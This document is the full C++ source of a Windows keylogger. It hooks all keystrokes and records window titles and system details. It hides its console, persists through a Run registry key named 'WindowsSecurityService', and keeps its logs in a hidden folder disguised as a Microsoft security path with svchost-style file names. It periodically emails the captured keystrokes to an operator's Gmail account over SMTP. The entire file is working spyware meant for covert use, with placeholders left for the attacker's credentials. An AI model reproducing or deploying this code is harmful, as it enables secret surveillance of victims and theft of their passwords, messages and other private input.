i #include <Windows.h>
#include <fstream>
#include <iostream>
#include <string>
#include <time.h>
#include <sstream>
#include <map>
#include <Lmcons.h>
#include <ShlObj.h>
#include <direct.h>

// For email functionality
#pragma comment(lib, "ws2_32.lib")
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tchar.h>

class KeyLogger {
private:
    std::ofstream logFile;
    std::string logFileName;
    std::string logDirectory;
    std::string emailAddress;
    std::string emailPassword;
    std::string smtpServer;
    int smtpPort;
    std::map<int, std::string> specialKeys;
    HHOOK keyboardHook;
    bool isRunning;
    time_t lastReportTime;
    int logInterval;

    // Initialize special key mappings
    void initSpecialKeys() {
        specialKeys[VK_SPACE] = " ";
        specialKeys[VK_RETURN] = "[ENTER]\n";
        specialKeys[VK_SHIFT] = "[SHIFT]";
        specialKeys[VK_BACK] = "[BACKSPACE]";
        specialKeys[VK_TAB] = "[TAB]";
        specialKeys[VK_CONTROL] = "[CTRL]";
        specialKeys[VK_MENU] = "[ALT]";
        specialKeys[VK_ESCAPE] = "[ESC]";
        specialKeys[VK_DELETE] = "[DEL]";
        specialKeys[VK_UP] = "[UP]";
        specialKeys[VK_DOWN] = "[DOWN]";
        specialKeys[VK_LEFT] = "[LEFT]";
        specialKeys[VK_RIGHT] = "[RIGHT]";
        specialKeys[VK_CAPITAL] = "[CAPS]";
        specialKeys[VK_SNAPSHOT] = "[PRTSCR]";
        specialKeys[VK_INSERT] = "[INS]";
        specialKeys[VK_HOME] = "[HOME]";
        specialKeys[VK_END] = "[END]";
        specialKeys[VK_PRIOR] = "[PGUP]";
        specialKeys[VK_NEXT] = "[PGDN]";
        specialKeys[VK_F1] = "[F1]";
        specialKeys[VK_F2] = "[F2]";
        specialKeys[VK_F3] = "[F3]";
        specialKeys[VK_F4] = "[F4]";
        specialKeys[VK_F5] = "[F5]";
        specialKeys[VK_F6] = "[F6]";
        specialKeys[VK_F7] = "[F7]";
        specialKeys[VK_F8] = "[F8]";
        specialKeys[VK_F9] = "[F9]";
        specialKeys[VK_F10] = "[F10]";
        specialKeys[VK_F11] = "[F11]";
        specialKeys[VK_F12] = "[F12]";
    }

    // Get active window title
    std::string getActiveWindowTitle() {
        char title[256];
        HWND hwnd = GetForegroundWindow();
        GetWindowTextA(hwnd, title, sizeof(title));
        return title;
    }

    // Add program to startup - ensures persistence after reboot
    void addToStartup() {
        HKEY hKey;
        RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
        
        char filename[MAX_PATH];
        GetModuleFileNameA(NULL, filename, MAX_PATH);
        
        RegSetValueExA(hKey, "WindowsSecurityService", 0, REG_SZ, (const BYTE*)filename, strlen(filename));
        RegCloseKey(hKey);
    }

    // Create the necessary directory structure
    void createDirectoryStructure() {
        char appDataPath[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
        
        // Create a hidden directory for logs
        logDirectory = std::string(appDataPath) + "\\Microsoft\\Windows\\Security\\Logs\\";
        
        // Create directories recursively
        std::string tempPath = logDirectory;
        for (size_t i = 0; i < tempPath.size(); i++) {
            if (tempPath[i] == '\\') {
                std::string subdir = tempPath.substr(0, i);
                if (!subdir.empty()) {
                    _mkdir(subdir.c_str());
                }
            }
        }
        _mkdir(tempPath.c_str());
        
        // Set directory attributes to hidden
        SetFileAttributesA(logDirectory.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }

    // Encode data for email attachment
    std::string base64Encode(const std::string& data) {
        static const std::string base64_chars = 
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        
        std::string ret;
        int i = 0;
        int j = 0;
        unsigned char char_array_3[3];
        unsigned char char_array_4[4];
        
        unsigned int data_len = data.size();
        const char* data_ptr = data.c_str();
        
        while (data_len--) {
            char_array_3[i++] = *(data_ptr++);
            if (i == 3) {
                char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
                char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
                char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
                char_array_4[3] = char_array_3[2] & 0x3f;
                
                for(i = 0; i < 4; i++)
                    ret += base64_chars[char_array_4[i]];
                i = 0;
            }
        }
        
        if (i) {
            for(j = i; j < 3; j++)
                char_array_3[j] = '\0';
            
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            
            for (j = 0; j < i + 1; j++)
                ret += base64_chars[char_array_4[j]];
            
            while((i++ < 3))
                ret += '=';
        }
        
        return ret;
    }

public:
    // Constructor initializes the keylogger
    KeyLogger(const std::string& email, const std::string& password, const std::string& smtp = "smtp.gmail.com", int port = 587) 
        : isRunning(false), logInterval(300), emailAddress(email), emailPassword(password), smtpServer(smtp), smtpPort(port) {
        
        // Initialize special keys mapping
        initSpecialKeys();
        
        // Create directory structure
        createDirectoryStructure();
        
        // Generate timestamp-based filename
        time_t now = time(0);
        struct tm* timeinfo = localtime(&now);
        char buffer[80];
        strftime(buffer, 80, "%Y%m%d-%H%M%S", timeinfo);
        
        // Create log file
        logFileName = logDirectory + "svchost_" + buffer + ".log";
        logFile.open(logFileName, std::ios::app);
        
        lastReportTime = time(0);

        // Initialize Winsock for email functionality
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
    }

    ~KeyLogger() {
        stop();
        if (logFile.is_open()) {
            logFile.close();
        }
        WSACleanup();
    }

    // Start the keylogger and install hooks
    void start() {
        if (isRunning) return;
        
        // Add to startup for persistence after reboot
        addToStartup();
        
        // Hide the console window
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        
        // Set up low-level keyboard hook
        keyboardHook = SetWindowsHookEx(
            WH_KEYBOARD_LL,
            [](int nCode, WPARAM wParam, LPARAM lParam) -> LRESULT {
                if (nCode >= 0 && wParam == WM_KEYDOWN) {
                    KeyLogger* logger = reinterpret_cast<KeyLogger*>(GetWindowLongPtr(GetConsoleWindow(), GWLP_USERDATA));
                    if (logger) {
                        logger->logKey(((KBDLLHOOKSTRUCT*)lParam)->vkCode);
                    }
                }
                return CallNextHookEx(NULL, nCode, wParam, lParam);
            },
            GetModuleHandle(NULL),
            0
        );
        
        SetWindowLongPtr(GetConsoleWindow(), GWLP_USERDATA, reinterpret_cast<LONG_PTR>(this));
        isRunning = true;
        
        // Log system info
        logSystemInfo();
        
        // Message loop
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
            
            // Check if it's time to send logs via email
            time_t now = time(0);
            if (difftime(now, lastReportTime) >= logInterval) {
                sendLogsToEmail();
                lastReportTime = now;
            }
        }
    }

    // Log key press
    void logKey(int vkCode) {
        std::string currentWindow = getActiveWindowTitle();
        static std::string lastWindow = "";
        
        if (currentWindow != lastWindow) {
            time_t now = time(0);
            struct tm* timeinfo = localtime(&now);
            char buffer[80];
            strftime(buffer, 80, "%Y-%m-%d %H:%M:%S", timeinfo);
            
            logFile << "\n\n[" << buffer << "] Window: " << currentWindow << "\n";
            lastWindow = currentWindow;
        }
        
        if (specialKeys.find(vkCode) != specialKeys.end()) {
            logFile << specialKeys[vkCode];
        } else {
            // Handle regular keys
            BYTE keyState[256] = {0};
            GetKeyboardState(keyState);
            
            WCHAR buffer[2];
            UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
            
            // Convert virtual key to unicode character considering keyboard layout
            HKL layout = GetKeyboardLayout(0);
            int result = ToUnicodeEx(vkCode, scanCode, keyState, buffer, 2, 0, layout);
            
            if (result > 0) {
                for (int i = 0; i < result; ++i) {
                    // Convert wide char to multibyte for output
                    char mbchar[3] = {0};
                    WideCharToMultiByte(CP_ACP, 0, &buffer[i], 1, mbchar, 3, NULL, NULL);
                    logFile << mbchar;
                }
            }
        }
        
        logFile.flush();
    }

    // Log system information
    void logSystemInfo() {
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName) / sizeof(computerName[0]);
        GetComputerNameA(computerName, &size);
        
        char username[UNLEN + 1];
        DWORD usernameLen = UNLEN + 1;
        GetUserNameA(username, &usernameLen);
        
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        
        logFile << "=== System Information ===" << std::endl;
        logFile << "Computer: " << computerName << std::endl;
        logFile << "User: " << username << std::endl;
        
        OSVERSIONINFOA osInfo;
        osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
        // Note: GetVersionEx is deprecated, but used here for simplicity
        #pragma warning(disable : 4996)
        GetVersionExA(&osInfo);
        logFile << "Windows Version: " << osInfo.dwMajorVersion << "." << osInfo.dwMinorVersion << std::endl;
        #pragma warning(default : 4996)
        
        logFile << "Processor: " << sysInfo.dwNumberOfProcessors << " processors" << std::endl;
        
        // Get IP address
        char hostName[256];
        if (gethostname(hostName, sizeof(hostName)) == 0) {
            struct addrinfo hints, *res;
            memset(&hints, 0, sizeof(hints));
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_STREAM;
            
            if (getaddrinfo(hostName, NULL, &hints, &res) == 0) {
                char ipAddress[INET_ADDRSTRLEN];
                struct sockaddr_in *addr = (struct sockaddr_in *)res->ai_addr;
                inet_ntop(AF_INET, &(addr->sin_addr), ipAddress, INET_ADDRSTRLEN);
                logFile << "IP Address: " << ipAddress << std::endl;
                freeaddrinfo(res);
            }
        }
        
        logFile << "==========================" << std::endl << std::endl;
        logFile.flush();
    }

    // Send logs to email address as attachment
    void sendLogsToEmail() {
        if (!logFile.is_open()) return;
        
        // Close the file to ensure all data is flushed
        logFile.close();
        
        // Read the log file
        std::ifstream file(logFileName, std::ios::binary);
        if (!file.is_open()) {
            // Reopen the log file for appending
            logFile.open(logFileName, std::ios::app);
            return;
        }
        
        std::string fileContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        
        // Generate a unique boundary for the email
        std::string boundary = "------------KeyloggerBoundary";
        
        // Get computer and user info for the subject
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName) / sizeof(computerName[0]);
        GetComputerNameA(computerName, &size);
        
        char username[UNLEN + 1];
        DWORD usernameLen = UNLEN + 1;
        GetUserNameA(username, &usernameLen);
        
        // Get current timestamp
        time_t now = time(0);
        struct tm* timeinfo = localtime(&now);
        char timeBuffer[80];
        strftime(timeBuffer, 80, "%Y-%m-%d %H:%M:%S", timeinfo);
        
        // Create a socket
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            // Reopen the log file for appending
            logFile.open(logFileName, std::ios::app);
            return;
        }
        
        // Connect to the SMTP server
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(smtpPort);
        
        struct addrinfo hints, *res;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        
        if (getaddrinfo(smtpServer.c_str(), NULL, &hints, &res) != 0) {
            closesocket(sock);
            // Reopen the log file for appending
            logFile.open(logFileName, std::ios::app);
            return;
        }
        
        server.sin_addr = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
        freeaddrinfo(res);
        
        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) != 0) {
            closesocket(sock);
            // Reopen the log file for appending
            logFile.open(logFileName, std::ios::app);
            return;
        }
        
        // Buffer for receiving server responses
        char buffer[1024];
        recv(sock, buffer, sizeof(buffer), 0);
        
        // EHLO command
        std::string ehlo = "EHLO " + std::string(computerName) + "\r\n";
        send(sock, ehlo.c_str(), ehlo.length(), 0);
        recv(sock, buffer, sizeof(buffer), 0);
        
        // Start TLS if using port 587
        if (smtpPort == 587) {
            std::string starttls = "STARTTLS\r\n";
            send(sock, starttls.c_str(), starttls.length(), 0);
            recv(sock, buffer, sizeof(buffer), 0);
            
            // Upgrade to SSL/TLS (simplified for example - actual implementation would use SSL functions)
            // Would need to add OpenSSL or similar library for proper TLS support
        }
        
        // Authentication
        std::string authLogin = "AUTH LOGIN\r\n";
        send(sock, authLogin.c_str(), authLogin.length(), 0);
        recv(sock, buffer, sizeof(buffer), 0);
        
        // Send username (Base64 encoded)
        std::string encodedUser = base64Encode(emailAddress) + "\r\n";
        send(sock, encodedUser.c_str(), encodedUser.length(), 0);
        recv(sock, buffer, sizeof(buffer), 0);
        
        // Send password (Base64 encoded)
        std::string encodedPass = base64Encode(emailPassword) + "\r\n";
        send(sock, encodedPass.c_str(), encodedPass.length(), 0);
        recv(sock, buffer, sizeof(buffer), 0);
        
        // MAIL FROM command
        std::string mailFrom = "MAIL FROM:<" + emailAddress + ">\r\n";
        send(sock, mailFrom.c_str(), mailFrom.length(), 0);
        recv(sock, buffer, sizeof(buffer), 0);
        
        // RCPT TO command
        std::string rcptTo = "RCPT TO:<" + emailAddress + ">\r\n";
        send(sock, rcptTo.c_str(), rcptTo.length(), 0);
        recv(sock, buffer, sizeof(buffer), 0);
        
        // DATA command
        std::string data = "DATA\r\n";
        send(sock, data.c_str(), data.length(), 0);
        recv(sock, buffer, sizeof(buffer), 0);
        
        // Email headers and content
        std::string subject = "Keylogger Report - " + std::string(computerName) + " - " + std::string(username) + " - " + std::string(timeBuffer);
        std::string emailContent = "From: " + emailAddress + "\r\n"
                                + "To: " + emailAddress + "\r\n"
                                + "Subject: " + subject + "\r\n"
                                + "MIME-Version: 1.0\r\n"
                                + "Content-Type: multipart/mixed; boundary=\"" + boundary + "\"\r\n"
                                + "\r\n"
                                + "--" + boundary + "\r\n"
                                + "Content-Type: text/plain; charset=UTF-8\r\n"
                                + "Content-Transfer-Encoding: 7bit\r\n"
                                + "\r\n"
                                + "Keylogger report attached.\r\n"
                                + "\r\n"
                                + "--" + boundary + "\r\n"
                                + "Content-Type: text/plain; charset=UTF-8; name=\"keylog.txt\"\r\n"
                                + "Content-Transfer-Encoding: base64\r\n"
                                + "Content-Disposition: attachment; filename=\"keylog.txt\"\r\n"
                                + "\r\n"
                                + base64Encode(fileContent) + "\r\n"
                                + "\r\n"
                                + "--" + boundary + "--\r\n"
                                + ".\r\n";
                                
        send(sock, emailContent.c_str(), emailContent.length(), 0);
        recv(sock, buffer, sizeof(buffer), 0);
        
        // QUIT command
        std::string quit = "QUIT\r\n";
        send(sock, quit.c_str(), quit.length(), 0);
        
        // Close socket
        closesocket(sock);
        
        // Reopen the log file for appending
        logFile.open(logFileName, std::ios::app);
    }

    // Stop the keylogger
    void stop() {
        if (!isRunning) return;
        
        UnhookWindowsHookEx(keyboardHook);
        isRunning = false;
    }
};

// Main function
int main() {
    // Attempt to create a mutex to ensure only one instance runs
    HANDLE hMutex = CreateMutexA(NULL, TRUE, "WindowsSecurityServiceMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }
    
    // Replace with your email and password
    // For Gmail, you may need to generate an app password
    KeyLogger keylogger("your_email@gmail.com", "your_email_password");
    keylogger.start();
    
    return 0;
}